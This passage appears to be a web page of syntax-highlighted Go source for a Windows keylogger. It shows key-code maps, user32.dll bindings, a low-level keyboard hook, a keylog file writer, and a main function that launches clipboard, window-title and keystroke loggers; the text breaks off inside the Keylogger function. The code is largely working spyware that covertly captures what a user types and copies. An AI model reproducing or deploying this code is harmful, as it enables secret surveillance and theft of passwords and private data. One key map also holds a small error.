class="string">"[F11]"</span>,</span><br><span class="line">	<span class="number">123</span>: <span class="string">"[F12]"</span>,</span><br><span class="line">	<span class="number">144</span>: <span class="string">"[NumLock]"</span>,</span><br><span class="line">	<span class="number">145</span>: <span class="string">"[ScrollLock]"</span>,</span><br><span class="line">	<span class="number">160</span>: <span class="string">""</span>, <span class="comment">//LShift</span></span><br><span class="line">	<span class="number">161</span>: <span class="string">""</span>, <span class="comment">//RShift</span></span><br><span class="line">	<span class="number">162</span>: <span class="string">"[Ctrl]"</span>,</span><br><span class="line">	<span class="number">163</span>: <span class="string">"[Ctrl]"</span>,</span><br><span class="line">	<span class="number">164</span>: <span class="string">"[Alt]"</span>, <span class="comment">//LeftMenu</span></span><br><span class="line">	<span class="number">165</span>: <span class="string">"[RightMenu]"</span>,</span><br><span class="line">	<span class="number">186</span>: <span class="string">";"</span>,</span><br><span class="line">	<span class="number">187</span>: <span class="string">"="</span>,</span><br><span class="line">	<span class="number">188</span>: <span class="string">","</span>,</span><br><span class="line">	<span class="number">189</span>: <span class="string">"-"</span>,</span><br><span class="line">	<span class="number">190</span>: <span class="string">"."</span>,</span><br><span class="line">	<span class="number">191</span>: <span class="string">"/"</span>,</span><br><span class="line">	<span class="number">192</span>: <span class="string">"`"</span>,</span><br><span class="line">	<span class="number">219</span>: <span class="string">"["</span>,</span><br><span class="line">	<span class="number">220</span>: <span class="string">"\\"</span>,</span><br><span class="line">	<span class="number">221</span>: <span class="string">"]"</span>,</span><br><span class="line">	<span class="number">222</span>: <span class="string">"'"</span>,</span><br><span class="line">	<span class="number">223</span>: <span class="string">"!"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//SHIFT</span></span><br><span class="line"><span class="keyword">var</span> keys_high = <span class="keyword">map</span>[<span class="keyword">uint16</span>]<span class="keyword">string</span>&#123;</span><br><span class="line">	<span class="number">8</span>:   <span class="string">"[Back]"</span>,</span><br><span class="line">	<span class="number">9</span>:   <span class="string">"[Tab]"</span>,</span><br><span class="line">	<span class="number">10</span>:  <span class="string">"[Shift]"</span>,</span><br><span class="line">	<span class="number">13</span>:  <span class="string">"[Enter]\r\n"</span>,</span><br><span class="line">	<span class="number">17</span>:  <span class="string">"[Ctrl]"</span>,</span><br><span class="line">	<span class="number">18</span>:  <span class="string">"[Alt]"</span>,</span><br><span class="line">	<span class="number">20</span>:  <span class="string">""</span>, <span class="comment">//CAPS LOCK</span></span><br><span class="line">	<span class="number">27</span>:  <span class="string">"[Esc]"</span>,</span><br><span class="line">	<span class="number">32</span>:  <span class="string">" "</span>, <span class="comment">//SPACE</span></span><br><span class="line">	<span class="number">33</span>:  <span class="string">"[PageUp]"</span>,</span><br><span class="line">	<span class="number">34</span>:  <span class="string">"[PageDown]"</span>,</span><br><span class="line">	<span class="number">35</span>:  <span class="string">"[End]"</span>,</span><br><span class="line">	<span class="number">36</span>:  <span class="string">"[Home]"</span>,</span><br><span class="line">	<span class="number">37</span>:  <span class="string">"[Left]"</span>,</span><br><span class="line">	<span class="number">38</span>:  <span class="string">"[Up]"</span>,</span><br><span class="line">	<span class="number">39</span>:  <span class="string">"[Right]"</span>,</span><br><span class="line">	<span class="number">40</span>:  <span class="string">"[Down]"</span>,</span><br><span class="line">	<span class="number">41</span>:  <span class="string">"[Select]"</span>,</span><br><span class="line">	<span class="number">42</span>:  <span class="string">"[Print]"</span>,</span><br><span class="line">	<span class="number">43</span>:  <span class="string">"[Execute]"</span>,</span><br><span class="line">	<span class="number">44</span>:  <span class="string">"[PrintScreen]"</span>,</span><br><span class="line">	<span class="number">45</span>:  <span class="string">"[Insert]"</span>,</span><br><span class="line">	<span class="number">46</span>:  <span class="string">"[Delete]"</span>,</span><br><span class="line">	<span class="number">47</span>:  <span class="string">"[Help]"</span>,</span><br><span class="line">	<span class="number">48</span>:  <span class="string">")"</span>,</span><br><span class="line">	<span class="number">49</span>:  <span class="string">"!"</span>,</span><br><span class="line">	<span class="number">50</span>:  <span class="string">"@"</span>,</span><br><span class="line">	<span class="number">51</span>:  <span class="string">"#"</span>,</span><br><span class="line">	<span class="number">52</span>:  <span class="string">"$"</span>,</span><br><span class="line">	<span class="number">53</span>:  <span class="string">"%"</span>,</span><br><span class="line">	<span class="number">54</span>:  <span class="string">"^"</span>,</span><br><span class="line">	<span class="number">55</span>:  <span class="string">"&amp;"</span>,</span><br><span class="line">	<span class="number">56</span>:  <span class="string">"*"</span>,</span><br><span class="line">	<span class="number">57</span>:  <span class="string">"("</span>,</span><br><span class="line">	<span class="number">65</span>:  <span class="string">"A"</span>,</span><br><span class="line">	<span class="number">66</span>:  <span class="string">"B"</span>,</span><br><span class="line">	<span class="number">67</span>:  <span class="string">"C"</span>,</span><br><span class="line">	<span class="number">68</span>:  <span class="string">"D"</span>,</span><br><span class="line">	<span class="number">69</span>:  <span class="string">"E"</span>,</span><br><span class="line">	<span class="number">70</span>:  <span class="string">"F"</span>,</span><br><span class="line">	<span class="number">71</span>:  <span class="string">"G"</span>,</span><br><span class="line">	<span class="number">72</span>:  <span class="string">"H"</span>,</span><br><span class="line">	<span class="number">73</span>:  <span class="string">"I"</span>,</span><br><span class="line">	<span class="number">74</span>:  <span class="string">"J"</span>,</span><br><span class="line">	<span class="number">75</span>:  <span class="string">"K"</span>,</span><br><span class="line">	<span class="number">76</span>:  <span class="string">"L"</span>,</span><br><span class="line">	<span class="number">77</span>:  <span class="string">"M"</span>,</span><br><span class="line">	<span class="number">78</span>:  <span class="string">"N"</span>,</span><br><span class="line">	<span class="number">79</span>:  <span class="string">"O"</span>,</span><br><span class="line">	<span class="number">80</span>:  <span class="string">"P"</span>,</span><br><span class="line">	<span class="number">81</span>:  <span class="string">"Q"</span>,</span><br><span class="line">	<span class="number">82</span>:  <span class="string">"R"</span>,</span><br><span class="line">	<span class="number">83</span>:  <span class="string">"S"</span>,</span><br><span class="line">	<span class="number">84</span>:  <span class="string">"T"</span>,</span><br><span class="line">	<span class="number">85</span>:  <span class="string">"U"</span>,</span><br><span class="line">	<span class="number">86</span>:  <span class="string">"V"</span>,</span><br><span class="line">	<span class="number">87</span>:  <span class="string">"W"</span>,</span><br><span class="line">	<span class="number">88</span>:  <span class="string">"X"</span>,</span><br><span class="line">	<span class="number">89</span>:  <span class="string">"Y"</span>,</span><br><span class="line">	<span class="number">90</span>:  <span class="string">"Z"</span>,</span><br><span class="line">	<span class="number">91</span>:  <span class="string">"[Windows]"</span>,</span><br><span class="line">	<span class="number">92</span>:  <span class="string">"[Windows]"</span>,</span><br><span class="line">	<span class="number">93</span>:  <span class="string">"[Applications]"</span>,</span><br><span class="line">	<span class="number">94</span>:  <span class="string">""</span>,</span><br><span class="line">	<span class="number">95</span>:  <span class="string">"[Sleep]"</span>,</span><br><span class="line">	<span class="number">96</span>:  <span class="string">"0"</span>,</span><br><span class="line">	<span class="number">97</span>:  <span class="string">"1"</span>,</span><br><span class="line">	<span class="number">98</span>:  <span class="string">"2"</span>,</span><br><span class="line">	<span class="number">99</span>:  <span class="string">"3"</span>,</span><br><span class="line">	<span class="number">100</span>: <span class="string">"4"</span>,</span><br><span class="line">	<span class="number">101</span>: <span class="string">"5"</span>,</span><br><span class="line">	<span class="number">102</span>: <span class="string">"6"</span>,</span><br><span class="line">	<span class="number">103</span>: <span class="string">"7"</span>,</span><br><span class="line">	<span class="number">104</span>: <span class="string">"8"</span>,</span><br><span class="line">	<span class="number">105</span>: <span class="string">"9"</span>,</span><br><span class="line">	<span class="number">106</span>: <span class="string">"*"</span>,</span><br><span class="line">	<span class="number">107</span>: <span class="string">"+"</span>,</span><br><span class="line">	<span class="number">108</span>: <span class="string">"[Separator]"</span>,</span><br><span class="line">	<span class="number">109</span>: <span class="string">"-"</span>,</span><br><span class="line">	<span class="number">110</span>: <span class="string">"."</span>,</span><br><span class="line">	<span class="number">111</span>: <span class="string">"[Divide]"</span>,</span><br><span class="line">	<span class="number">112</span>: <span class="string">"[F1]"</span>,</span><br><span class="line">	<span class="number">113</span>: <span class="string">"[F2]"</span>,</span><br><span class="line">	<span class="number">114</span>: <span class="string">"[F3]"</span>,</span><br><span class="line">	<span class="number">115</span>: <span class="string">"[F4]"</span>,</span><br><span class="line">	<span class="number">116</span>: <span class="string">"[F5]"</span>,</span><br><span class="line">	<span class="number">117</span>: <span class="string">"[F6]"</span>,</span><br><span class="line">	<span class="number">118</span>: <span class="string">"[F7]"</span>,</span><br><span class="line">	<span class="number">119</span>: <span class="string">"[F8]"</span>,</span><br><span class="line">	<span class="number">120</span>: <span class="string">"[F9]"</span>,</span><br><span class="line">	<span class="number">121</span>: <span class="string">"[F10]"</span>,</span><br><span class="line">	<span class="number">122</span>: <span class="string">"[F11]"</span>,</span><br><span class="line">	<span class="number">123</span>: <span class="string">"[F12]"</span>,</span><br><span class="line">	<span class="number">144</span>: <span class="string">"[NumLock]"</span>,</span><br><span class="line">	<span class="number">145</span>: <span class="string">"[ScrollLock]"</span>,</span><br><span class="line">	<span class="number">160</span>: <span class="string">""</span>, <span class="comment">//LShift</span></span><br><span class="line">	<span class="number">161</span>: <span class="string">""</span>, <span class="comment">//RShift</span></span><br><span class="line">	<span class="number">162</span>: <span class="string">"[Ctrl]"</span>,</span><br><span class="line">	<span class="number">163</span>: <span class="string">"[Ctrl]"</span>,</span><br><span class="line">	<span class="number">164</span>: <span class="string">"[Alt]"</span>, <span class="comment">//LeftMenu</span></span><br><span class="line">	<span class="number">165</span>: <span class="string">"[RightMenu]"</span>,</span><br><span class="line">	<span class="number">186</span>: <span class="string">":"</span>,</span><br><span class="line">	<span class="number">187</span>: <span class="string">"+"</span>,</span><br><span class="line">	<span class="number">188</span>: <span class="string">"&lt;"</span>,</span><br><span class="line">	<span class="number">189</span>: <span class="string">"_"</span>,</span><br><span class="line">	<span class="number">190</span>: <span class="string">"&gt;"</span>,</span><br><span class="line">	<span class="number">191</span>: <span class="string">"?"</span>,</span><br><span class="line">	<span class="number">192</span>: <span class="string">"~"</span>,</span><br><span class="line">	<span class="number">219</span>: <span class="string">"°"</span>,</span><br><span class="line">	<span class="number">220</span>: <span class="string">"|"</span>,</span><br><span class="line">	<span class="number">221</span>: <span class="string">"&#125;"</span>,</span><br><span class="line">	<span class="number">222</span>: <span class="string">"\""</span>,</span><br><span class="line">	<span class="number">223</span>: <span class="string">"!"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//大小写</span></span><br><span class="line"><span class="keyword">var</span> capup = <span class="keyword">map</span>[<span class="keyword">uint16</span>]<span class="keyword">string</span>&#123;</span><br><span class="line">	<span class="number">8</span>:   <span class="string">"[Back]"</span>,</span><br><span class="line">	<span class="number">9</span>:   <span class="string">"[Tab]"</span>,</span><br><span class="line">	<span class="number">10</span>:  <span class="string">"[Shift]"</span>,</span><br><span class="line">	<span class="number">13</span>:  <span class="string">"[Enter]\r\n"</span>,</span><br><span class="line">	<span class="number">14</span>:  <span class="string">""</span>,</span><br><span class="line">	<span class="number">15</span>:  <span class="string">""</span>,</span><br><span class="line">	<span class="number">16</span>:  <span class="string">""</span>,</span><br><span class="line">	<span class="number">17</span>:  <span class="string">"[Ctrl]"</span>,</span><br><span class="line">	<span class="number">18</span>:  <span class="string">"[Alt]"</span>,</span><br><span class="line">	<span class="number">19</span>:  <span class="string">""</span>,</span><br><span class="line">	<span class="number">20</span>:  <span class="string">""</span>, <span class="comment">//CAPS LOCK</span></span><br><span class="line">	<span class="number">27</span>:  <span class="string">"[Esc]"</span>,</span><br><span class="line">	<span class="number">32</span>:  <span class="string">" "</span>, <span class="comment">//SPACE</span></span><br><span class="line">	<span class="number">33</span>:  <span class="string">"[PageUp]"</span>,</span><br><span class="line">	<span class="number">34</span>:  <span class="string">"[PageDown]"</span>,</span><br><span class="line">	<span class="number">35</span>:  <span class="string">"[End]"</span>,</span><br><span class="line">	<span class="number">36</span>:  <span class="string">"[Home]"</span>,</span><br><span class="line">	<span class="number">37</span>:  <span class="string">"[Left]"</span>,</span><br><span class="line">	<span class="number">38</span>:  <span class="string">"[Up]"</span>,</span><br><span class="line">	<span class="number">39</span>:  <span class="string">"[Right]"</span>,</span><br><span class="line">	<span class="number">40</span>:  <span class="string">"[Down]"</span>,</span><br><span class="line">	<span class="number">41</span>:  <span class="string">"[Select]"</span>,</span><br><span class="line">	<span class="number">42</span>:  <span class="string">"[Print]"</span>,</span><br><span class="line">	<span class="number">43</span>:  <span class="string">"[Execute]"</span>,</span><br><span class="line">	<span class="number">44</span>:  <span class="string">"[PrintScreen]"</span>,</span><br><span class="line">	<span class="number">45</span>:  <span class="string">"[Insert]"</span>,</span><br><span class="line">	<span class="number">46</span>:  <span class="string">"[Delete]"</span>,</span><br><span class="line">	<span class="number">47</span>:  <span class="string">"[Help]"</span>,</span><br><span class="line">	<span class="number">48</span>:  <span class="string">"0"</span>,</span><br><span class="line">	<span class="number">49</span>:  <span class="string">"1"</span>,</span><br><span class="line">	<span class="number">50</span>:  <span class="string">"2"</span>,</span><br><span class="line">	<span class="number">51</span>:  <span class="string">"3"</span>,</span><br><span class="line">	<span class="number">52</span>:  <span class="string">"4"</span>,</span><br><span class="line">	<span class="number">53</span>:  <span class="string">"5"</span>,</span><br><span class="line">	<span class="number">54</span>:  <span class="string">"6"</span>,</span><br><span class="line">	<span class="number">55</span>:  <span class="string">"7"</span>,</span><br><span class="line">	<span class="number">56</span>:  <span class="string">"8"</span>,</span><br><span class="line">	<span class="number">57</span>:  <span class="string">"9"</span>,</span><br><span class="line">	<span class="number">65</span>:  <span class="string">"A"</span>,</span><br><span class="line">	<span class="number">66</span>:  <span class="string">"B"</span>,</span><br><span class="line">	<span class="number">67</span>:  <span class="string">"C"</span>,</span><br><span class="line">	<span class="number">68</span>:  <span class="string">"D"</span>,</span><br><span class="line">	<span class="number">69</span>:  <span class="string">"E"</span>,</span><br><span class="line">	<span class="number">70</span>:  <span class="string">"F"</span>,</span><br><span class="line">	<span class="number">71</span>:  <span class="string">"G"</span>,</span><br><span class="line">	<span class="number">72</span>:  <span class="string">"H"</span>,</span><br><span class="line">	<span class="number">73</span>:  <span class="string">"I"</span>,</span><br><span class="line">	<span class="number">74</span>:  <span class="string">"J"</span>,</span><br><span class="line">	<span class="number">75</span>:  <span class="string">"K"</span>,</span><br><span class="line">	<span class="number">76</span>:  <span class="string">"L"</span>,</span><br><span class="line">	<span class="number">77</span>:  <span class="string">"M"</span>,</span><br><span class="line">	<span class="number">78</span>:  <span class="string">"N"</span>,</span><br><span class="line">	<span class="number">79</span>:  <span class="string">"O"</span>,</span><br><span class="line">	<span class="number">80</span>:  <span class="string">"P"</span>,</span><br><span class="line">	<span class="number">81</span>:  <span class="string">"P"</span>,</span><br><span class="line">	<span class="number">82</span>:  <span class="string">"R"</span>,</span><br><span class="line">	<span class="number">83</span>:  <span class="string">"S"</span>,</span><br><span class="line">	<span class="number">84</span>:  <span class="string">"T"</span>,</span><br><span class="line">	<span class="number">85</span>:  <span class="string">"U"</span>,</span><br><span class="line">	<span class="number">86</span>:  <span class="string">"V"</span>,</span><br><span class="line">	<span class="number">87</span>:  <span class="string">"W"</span>,</span><br><span class="line">	<span class="number">88</span>:  <span class="string">"X"</span>,</span><br><span class="line">	<span class="number">89</span>:  <span class="string">"Y"</span>,</span><br><span class="line">	<span class="number">90</span>:  <span class="string">"Z"</span>,</span><br><span class="line">	<span class="number">91</span>:  <span class="string">"[Windows]"</span>,</span><br><span class="line">	<span class="number">92</span>:  <span class="string">"[Windows]"</span>,</span><br><span class="line">	<span class="number">93</span>:  <span class="string">"[Applications]"</span>,</span><br><span class="line">	<span class="number">94</span>:  <span class="string">""</span>,</span><br><span class="line">	<span class="number">95</span>:  <span class="string">"[Sleep]"</span>,</span><br><span class="line">	<span class="number">96</span>:  <span class="string">"0"</span>,</span><br><span class="line">	<span class="number">97</span>:  <span class="string">"1"</span>,</span><br><span class="line">	<span class="number">98</span>:  <span class="string">"2"</span>,</span><br><span class="line">	<span class="number">99</span>:  <span class="string">"3"</span>,</span><br><span class="line">	<span class="number">100</span>: <span class="string">"4"</span>,</span><br><span class="line">	<span class="number">101</span>: <span class="string">"5"</span>,</span><br><span class="line">	<span class="number">102</span>: <span class="string">"6"</span>,</span><br><span class="line">	<span class="number">103</span>: <span class="string">"7"</span>,</span><br><span class="line">	<span class="number">104</span>: <span class="string">"8"</span>,</span><br><span class="line">	<span class="number">105</span>: <span class="string">"9"</span>,</span><br><span class="line">	<span class="number">106</span>: <span class="string">"*"</span>,</span><br><span class="line">	<span class="number">107</span>: <span class="string">"+"</span>,</span><br><span class="line">	<span class="number">108</span>: <span class="string">"[Separator]"</span>,</span><br><span class="line">	<span class="number">109</span>: <span class="string">"-"</span>,</span><br><span class="line">	<span class="number">110</span>: <span class="string">"."</span>,</span><br><span class="line">	<span class="number">111</span>: <span class="string">"[Divide]"</span>,</span><br><span class="line">	<span class="number">112</span>: <span class="string">"[F1]"</span>,</span><br><span class="line">	<span class="number">113</span>: <span class="string">"[F2]"</span>,</span><br><span class="line">	<span class="number">114</span>: <span class="string">"[F3]"</span>,</span><br><span class="line">	<span class="number">115</span>: <span class="string">"[F4]"</span>,</span><br><span class="line">	<span class="number">116</span>: <span class="string">"[F5]"</span>,</span><br><span class="line">	<span class="number">117</span>: <span class="string">"[F6]"</span>,</span><br><span class="line">	<span class="number">118</span>: <span class="string">"[F7]"</span>,</span><br><span class="line">	<span class="number">119</span>: <span class="string">"[F8]"</span>,</span><br><span class="line">	<span class="number">120</span>: <span class="string">"[F9]"</span>,</span><br><span class="line">	<span class="number">121</span>: <span class="string">"[F10]"</span>,</span><br><span class="line">	<span class="number">122</span>: <span class="string">"[F11]"</span>,</span><br><span class="line">	<span class="number">123</span>: <span class="string">"[F12]"</span>,</span><br><span class="line">	<span class="number">144</span>: <span class="string">"[NumLock]"</span>,</span><br><span class="line">	<span class="number">145</span>: <span class="string">"[ScrollLock]"</span>,</span><br><span class="line">	<span class="number">160</span>: <span class="string">""</span>, <span class="comment">//LShift</span></span><br><span class="line">	<span class="number">161</span>: <span class="string">""</span>, <span class="comment">//RShift</span></span><br><span class="line">	<span class="number">162</span>: <span class="string">"[Ctrl]"</span>,</span><br><span class="line">	<span class="number">163</span>: <span class="string">"[Ctrl]"</span>,</span><br><span class="line">	<span class="number">164</span>: <span class="string">"[Alt]"</span>, <span class="comment">//LeftMenu</span></span><br><span class="line">	<span class="number">165</span>: <span class="string">"[RightMenu]"</span>,</span><br><span class="line">	<span class="number">186</span>: <span class="string">";"</span>,</span><br><span class="line">	<span class="number">187</span>: <span class="string">"="</span>,</span><br><span class="line">	<span class="number">188</span>: <span class="string">","</span>,</span><br><span class="line">	<span class="number">189</span>: <span class="string">"-"</span>,</span><br><span class="line">	<span class="number">190</span>: <span class="string">"."</span>,</span><br><span class="line">	<span class="number">191</span>: <span class="string">"/"</span>,</span><br><span class="line">	<span class="number">192</span>: <span class="string">"`"</span>,</span><br><span class="line">	<span class="number">219</span>: <span class="string">"["</span>,</span><br><span class="line">	<span class="number">220</span>: <span class="string">"\\"</span>,</span><br><span class="line">	<span class="number">221</span>: <span class="string">"]"</span>,</span><br><span class="line">	<span class="number">222</span>: <span class="string">"'"</span>,</span><br><span class="line">	<span class="number">223</span>: <span class="string">"!"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	user32                  = windows.NewLazySystemDLL(<span class="string">"user32.dll"</span>)</span><br><span class="line">	procSetWindowsHookEx    = user32.NewProc(<span class="string">"SetWindowsHookExW"</span>)</span><br><span class="line">	procCallNextHookEx      = user32.NewProc(<span class="string">"CallNextHookEx"</span>)</span><br><span class="line">	procUnhookWindowsHookEx = user32.NewProc(<span class="string">"UnhookWindowsHookEx"</span>)</span><br><span class="line">	procGetMessage          = user32.NewProc(<span class="string">"GetMessageW"</span>)</span><br><span class="line">	procGetKeyState         = user32.NewProc(<span class="string">"GetKeyState"</span>)</span><br><span class="line">	procGetAsyncKeyState    = user32.NewProc(<span class="string">"GetAsyncKeyState"</span>)</span><br><span class="line">	procGetForegroundWindow = user32.NewProc(<span class="string">"GetForegroundWindow"</span>)</span><br><span class="line">	procGetWindowTextW      = user32.NewProc(<span class="string">"GetWindowTextW"</span>)</span><br><span class="line">	keyboardHook            HHOOK</span><br><span class="line">	tmpKeylog               <span class="keyword">string</span></span><br><span class="line">	vowelMin                <span class="keyword">string</span> = <span class="string">"aeiou"</span></span><br><span class="line">	vowelMaj                <span class="keyword">string</span> = <span class="string">"AEIOU"</span></span><br><span class="line">	writer                  Writer</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	WH_KEYBOARD_LL = <span class="number">13</span></span><br><span class="line">	WM_KEYDOWN     = <span class="number">256</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> (</span><br><span class="line">	DWORD     <span class="keyword">uint32</span></span><br><span class="line">	WPARAM    <span class="keyword">uintptr</span></span><br><span class="line">	LPARAM    <span class="keyword">uintptr</span></span><br><span class="line">	LRESULT   <span class="keyword">uintptr</span></span><br><span class="line">	HANDLE    <span class="keyword">uintptr</span></span><br><span class="line">	HINSTANCE HANDLE</span><br><span class="line">	HHOOK     HANDLE</span><br><span class="line">	HWND      HANDLE</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> HOOKPROC <span class="function"><span class="keyword">func</span><span class="params">(<span class="keyword">int</span>, WPARAM, LPARAM)</span> <span class="title">LRESULT</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">type</span> <span class="title">KBDLLHOOKSTRUCT</span> <span class="title">struct</span></span> &#123;</span><br><span class="line">	VkCode      DWORD</span><br><span class="line">	ScanCode    DWORD</span><br><span class="line">	Flags       DWORD</span><br><span class="line">	Time        DWORD</span><br><span class="line">	DwExtraInfo <span class="keyword">uintptr</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> POINT <span class="keyword">struct</span> &#123;</span><br><span class="line">	X, Y <span class="keyword">int32</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> MSG <span class="keyword">struct</span> &#123;</span><br><span class="line">	Hwnd    HWND</span><br><span class="line">	Message <span class="keyword">uint32</span></span><br><span class="line">	WParam  <span class="keyword">uintptr</span></span><br><span class="line">	LParam  <span class="keyword">uintptr</span></span><br><span class="line">	Time    <span class="keyword">uint32</span></span><br><span class="line">	Pt      POINT</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CreateKeylogFile</span><span class="params">(path <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	file, err := os.Create(path)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(<span class="string">"Cannot create file"</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> file.Close()</span><br><span class="line">	writer.file = file</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">go</span> clipboardLogger()</span><br><span class="line">	<span class="keyword">go</span> WindowLogger()</span><br><span class="line">	Keylogger()</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SetWindowsHookEx</span><span class="params">(idHook <span class="keyword">int</span>, lpfn HOOKPROC, hMod HINSTANCE, dwThreadId DWORD)</span> <span class="title">HHOOK</span></span> &#123;</span><br><span class="line">	ret, _, _ := procSetWindowsHookEx.Call(</span><br><span class="line">		<span class="keyword">uintptr</span>(idHook),</span><br><span class="line">		<span class="keyword">uintptr</span>(syscall.NewCallback(lpfn)),</span><br><span class="line">		<span class="keyword">uintptr</span>(hMod),</span><br><span class="line">		<span class="keyword">uintptr</span>(dwThreadId),</span><br><span class="line">	)</span><br><span class="line">	<span class="keyword">return</span> HHOOK(ret)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CallNextHookEx</span><span class="params">(hhk HHOOK, nCode <span class="keyword">int</span>, wParam WPARAM, lParam LPARAM)</span> <span class="title">LRESULT</span></span> &#123;</span><br><span class="line">	ret, _, _ := procCallNextHookEx.Call(</span><br><span class="line">		<span class="keyword">uintptr</span>(hhk),</span><br><span class="line">		<span class="keyword">uintptr</span>(nCode),</span><br><span class="line">		<span class="keyword">uintptr</span>(wParam),</span><br><span class="line">		<span class="keyword">uintptr</span>(lParam),</span><br><span class="line">	)</span><br><span class="line">	<span class="keyword">return</span> LRESULT(ret)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UnhookWindowsHookEx</span><span class="params">(hhk HHOOK)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	ret, _, _ := procUnhookWindowsHookEx.Call(</span><br><span class="line">		<span class="keyword">uintptr</span>(hhk),</span><br><span class="line">	)</span><br><span class="line">	<span class="keyword">return</span> ret != <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetMessage</span><span class="params">(msg *MSG, hwnd HWND, msgFilterMin <span class="keyword">uint32</span>, msgFilterMax <span class="keyword">uint32</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	ret, _, _ := procGetMessage.Call(</span><br><span class="line">		<span class="keyword">uintptr</span>(unsafe.Pointer(msg)),</span><br><span class="line">		<span class="keyword">uintptr</span>(hwnd),</span><br><span class="line">		<span class="keyword">uintptr</span>(msgFilterMin),</span><br><span class="line">		<span class="keyword">uintptr</span>(msgFilterMax))</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">int</span>(ret)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getForegroundWindow</span><span class="params">()</span> <span class="params">(hwnd syscall.Handle, err error)</span></span> &#123;</span><br><span class="line">	r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">if</span> e1 != <span class="number">0</span> &#123;</span><br><span class="line">		err = error(e1)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	hwnd = syscall.Handle(r0)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getWindowText</span><span class="params">(hwnd syscall.Handle, str *<span class="keyword">uint16</span>, maxCount <span class="keyword">int32</span>)</span> <span class="params">(<span class="built_in">len</span> <span class="keyword">int32</span>, err error)</span></span> &#123;</span><br><span class="line">	r0, _, e1 := syscall.Syscall(procGetWindowTextW.Addr(), <span class="number">3</span>, <span class="keyword">uintptr</span>(hwnd), <span class="keyword">uintptr</span>(unsafe.Pointer(str)), <span class="keyword">uintptr</span>(maxCount))</span><br><span class="line">	<span class="built_in">len</span> = <span class="keyword">int32</span>(r0)</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span> == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> e1 != <span class="number">0</span> &#123;</span><br><span class="line">			err = error(e1)</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			err = syscall.EINVAL</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WindowLogger</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> tmpTitle <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		g, _ := getForegroundWindow()</span><br><span class="line">		b := <span class="built_in">make</span>([]<span class="keyword">uint16</span>, <span class="number">200</span>)</span><br><span class="line">		_, err := getWindowText(g, &amp;b[<span class="number">0</span>], <span class="keyword">int32</span>(<span class="built_in">len</span>(b)))</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> syscall.UTF16ToString(b) != <span class="string">""</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> tmpTitle != syscall.UTF16ToString(b) &#123;</span><br><span class="line">				tmpTitle = syscall.UTF16ToString(b)</span><br><span class="line">				tmpKeylog += <span class="keyword">string</span>(<span class="string">"\r\n["</span> + tmpTitle + <span class="string">"]\r\n"</span>)</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		time.Sleep(<span class="number">1</span> * time.Millisecond)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Keylogger</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> msg MSG</span><br><span class="line">	CAPS, _, _ := procGetKeyState.Call(<span class="keyword">uintptr</span>(w32.VK_CAPITAL))</span><br><span class="line">	CAPS = CAPS &amp; <span class="number">0x000001</span></span><br><span class="line">	<span class="keyword">var</span> CAPS2 <span class="keyword">uintptr</span></span><br><span class="line">	<span class="keyword">var</span> SHIFT <span class="keyword">uintptr</span></span><br><span class="line">	<span class="keyword">var</span> precLog <span 